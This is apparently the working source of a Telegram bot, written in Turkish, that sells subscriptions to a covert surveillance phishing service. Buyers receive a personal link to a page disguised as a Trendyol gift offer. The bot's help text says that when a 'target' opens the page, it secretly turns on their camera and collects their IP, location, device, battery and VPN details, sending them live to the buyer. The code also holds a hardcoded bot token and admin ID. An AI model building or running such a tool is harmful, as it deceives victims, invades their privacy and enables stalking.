from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup, BotCommand
from telegram.ext import ApplicationBuilder, CommandHandler, MessageHandler, filters, CallbackQueryHandler, ContextTypes
from datetime import datetime, timedelta
import random
import string
import asyncio
from telegram.error import BadRequest

TOKEN = "9186950420:AAG8uPX7NKievzNPC9Ekje4tUN_MGObv4ZE"
ADMIN_ID = '8788829431'
CHANNEL_USERNAME = '@ayykol'
LINK_BASE = "https://trendyolgift.github.io/ay-kol/?chat="

kullanicilar = {}
secim_kayit = {}
kullanilmis_sifreler = set()

sureler = {
    "1 Aylık - 100 TL": 30,
    "3 Aylık - 250 TL": 90,
    "5 Aylık - 450 TL": 150,
    "1 Yıllık - 800 TL": 365,
    "Sınırsız - 600 TL": None
}

async def check_channel_membership(user_id, bot):
    try:
        member = await bot.get_chat_member(chat_id=CHANNEL_USERNAME, user_id=user_id)
        return member.status in ['member', 'creator', 'administrator']
    except BadRequest:
        return False

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user
    kullanici_adi = user.mention_html() if user.username else user.first_name

    if not await check_channel_membership(user.id, context.bot):  
        keyboard = [[InlineKeyboardButton("Kanala Katıl", url=f"https://t.me/{CHANNEL_USERNAME[1:]}")]]  
        await update.message.reply_html(  
            f"Selam {kullanici_adi}, satın alma işlemlerine devam etmek için önce <a href='https://t.me/{CHANNEL_USERNAME[1:]}'>{CHANNEL_USERNAME}</a> kanalına katılmalısın.",  
            reply_markup=InlineKeyboardMarkup(keyboard),  
            disable_web_page_preview=True  
        )  
        return  

    keyboard = [[  
        InlineKeyboardButton("Web Sitesi Nasıl Çalışır?", callback_data="sistem"),  
        InlineKeyboardButton("Satın Al", callback_data="satinal")  
    ]]  
    await update.message.reply_html(  
        f"Merhaba {kullanici_adi}, Ayık Ol Botuna hoş geldiniz.\n"  
        "Aşağıdaki menüden ihtiyacınız olan seçeneği seçebilirsiniz.\n\n"  
        "Keyifli kullanım dileriz.",  
        reply_markup=InlineKeyboardMarkup(keyboard)  
    )

async def handle_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()

    if query.data == "sistem":  
        mesaj = (  
            "📌 Sistem Özeti:\n\n"  
            "1. Satın alma işleminizi tamamlayın, sistem size özel bağlantı ve şifre oluşturacaktır.\n\n"    
            "2. Bu bağlantıyı hedef kişiye gönderin.\n\n"    
            "3. Hedef kişi siteye giriş yapıp şifreyi kullandığında sistem aktif hale gelir:\n"    
            "   - Kamera arka planda otomatik açılır.\n"    
            "   - IP adresi, ülke, şehir, konum, cihaz bilgisi, tarayıcı tipi, batarya durumu ve VPN kontrolü yapılır.\n"    
            "   - Elde edilen tüm bilgiler anlık olarak Telegram hesabınıza iletilir.\n\n"    
            "4. Hedef kullanıcıya herhangi bir veri gösterilmez, yalnızca Trendyol indirim kodu aldığı izlenimi verilir.\n\n"    
            "5. Sistem tamamen otomatik çalışır, ek bir işlem yapmanıza gerek yoktur."  
        )  
        keyboard = [[InlineKeyboardButton("Geri", callback_data="geri")]]  
        await query.message.reply_text(mesaj, reply_markup=InlineKeyboardMarkup(keyboard))  

    elif query.data == "satinal":  
        keyboard = [[InlineKeyboardButton(secenek, callback_data=f"odeme|{secenek}")] for secenek in sureler.keys()]  
        keyboard.append([InlineKeyboardButton("Geri", callback_data="geri")])  
        await query.message.edit_text(  
            "Satın almak istediğiniz paketi seçin:",  
            reply_markup=InlineKeyboardMarkup(keyboard)  
        )  

    elif query.data.startswith("odeme"):  
        secim = query.data.split("|")[1]  
        keyboard = [[InlineKeyboardButton("Ödeme Yaptım", callback_data=f"gonder|{secim}")]  
        await query.message.edit_text(  
            f"Seçilen Paket: {secim}\n\n"  
            "Lütfen ödemenizi aşağıdaki IBAN’a yapınız:\n\n"  
            "IBAN: 1234567890\n\nLütfen ödeme ekran görüntüsünü bu sohbete gönderin.",  
            reply_markup=InlineKeyboardMarkup(keyboard)  
        )  

    elif query.data.startswith("gonder"):  
        secim = query.data.split("|")[1]  
        context.user_data["onay_bekleyen"] = secim  
        await query.message.edit_text("📷 Ödeme ekran görüntüsünü bu sohbete gönderiniz.")  

    elif query.data == "geri":  
        keyboard = [[  
            InlineKeyboardButton("Web Sitesi Nasıl Çalışır?", callback_data="sistem"),  
            InlineKeyboardButton("Satın Al", callback_data="satinal")  
        ]]  
        await query.message.edit_text(  
            "Ayık Ol Botuna hoş geldiniz.\n"  
            "Aşağıdaki menüden seçeneği seçebilirsiniz.",  
            reply_markup=InlineKeyboardMarkup(keyboard)  
        )

async def foto_geldi(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.message.from_user
    if "onay_bekleyen" in context.user_data:
        secim = context.user_data["onay_bekleyen"]
        secim_kayit[user.id] = secim

        await context.bot.send_photo(  
            chat_id=ADMIN_ID,  
            photo=update.message.photo[-1].file_id,  
            caption=(  
                f"💸 Yeni Satın Alma Talebi\n"  
                f"Kullanıcı: @{user.username or user.first_name}\n"  
                f"ID: {user.id}\n"  
                f"Paket: {secim}"  
            ),  
            parse_mode="HTML"  
        )  
        await update.message.reply_text(  
            "📤 Talebiniz yöneticimize iletildi. Onaylandıktan sonra /link komutunu kullanabilirsiniz."  
        )  
        del context.user_data["onay_bekleyen"]

async def onayla(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id != int(ADMIN_ID):
        return

    if len(context.args) != 1:  
        await update.message.reply_text("Kullanım: /onayla USER_ID")  
        return  

    try:  
        user_id = int(context.args[0])  
    except ValueError:  
        await update.message.reply_text("Geçersiz kullanıcı ID'si.")  
        return  

    if user_id not in secim_kayit:  
        await update.message.reply_text("Bu kullanıcıdan ödeme bilgisi alınmamış.")  
        return  

    secim = secim_kayit[user_id]  
    sure_gun = sureler[secim]  

    while True:  
        sifre = ''.join(random.choices(string.digits, k=6))  
        if sifre not in kullanilmis_sifreler:  
            kullanilmis_sifreler.add(sifre)  
            break  

    if sure_gun is None:  
        kullanicilar[user_id] = {"bitis": None, "sifre": sifre}  
    else:  
        bitis = datetime.now() + timedelta(days=sure_gun)  
        kullanicilar[user_id] = {"bitis": bitis, "sifre": sifre}  

    link = f"{LINK_BASE}{user_id}&sifre={sifre}"  

    user = await context.bot.get_chat(user_id)  
    username = f"@{user.username}" if user.username else user.first_name  
    zaman = datetime.now().strftime("%d.%m.%Y %H:%M:%S")  

    kanal_mesaj = (  
        f"✅ Yeni Satın Alma Onayı\n"  
        f"Kullanıcı: {username}\n"  
        f"Paket: {secim}\n"  
        f"Süre: {sure_gun if sure_gun is not None else 'Sınırsız'} gün\n"  
        f"Tarih: {zaman}"  
    )  
    await context.bot.send_message(chat_id=CHANNEL_USERNAME, text=kanal_mesaj)  

    await context.bot.send_message(  
        chat_id=user_id,  
        text=(  
            f"✅ Satın alma işleminiz onaylandı!\n\n"  
            f"🔗 Link: {link}\n"  
            f"🔐 Şifre: {sifre}\n\n"  
            f"/link → tekrar almak için\n"  
            f"/sure → süreyi görmek için"  
        )  
    )  
    await update.message.reply_text("Kullanıcı başarıyla onaylandı.")

async def link(update: Update, context: ContextTypes.DEFAULT_TYPE):
    uid = update.effective_user.id
    if uid not in kullanicilar:
        await update.message.reply_text("Satın alma yapmadığınız tespit edildi.")
        return

    veri = kullanicilar[uid]  
    bitis = veri["bitis"]  
    sifre = veri["sifre"]  

    if bitis is not None and datetime.now() > bitis:  
        await update.message.reply_text("❌ Kullanım süreniz dolmuş.")  
        return  

    link = f"{LINK_BASE}{uid}&sifre={sifre}"  
    await update.message.reply_text(f"🔗 Kişisel bağlantınız: {link}")

async def sure(update: Update, context: ContextTypes.DEFAULT_TYPE):
    uid = update.effective_user.id
    if uid not in kullanicilar:
        await update.message.reply_text("Satın alma işlemi bulunamadı.")
        return

    bitis = kullanicilar[uid]["bitis"]  
    if bitis is None:  
        await update.message.reply_text("Kullanım süreniz: Sınırsız")  
        return  

    kalan = bitis - datetime.now()  
    if kalan.total_seconds() < 0:  
        await update.message.reply_text("❌ Kullanım süreniz dolmuş.")  
        return  

    await update.message.reply_text(f"Kalan kullanım süreniz: {kalan.days} gün")

if __name__ == "__main__":
    loop = asyncio.new_event_loop()
    asyncio.set_event_loop(loop)

    app = ApplicationBuilder().token(TOKEN).build()  

    app.add_handler(CommandHandler("start", start))  
    app.add_handler(CommandHandler("onayla", onayla))  
    app.add_handler(CommandHandler("link", link))  
    app.add_handler(CommandHandler("sure", sure))  
    app.add_handler(MessageHandler(filters.PHOTO, foto_geldi))  
    app.add_handler(CallbackQueryHandler(handle_callback))  

    async def set_commands():  
        await app.bot.set_my_commands([  
            BotCommand("start", "Bota başla"),  
            BotCommand("link", "Kişisel giriş bağlantını al"),  
            BotCommand("sure", "Kullanım süresini görüntüle")  
        ])  

    loop.run_until_complete(set_commands())  
    app.run_polling()

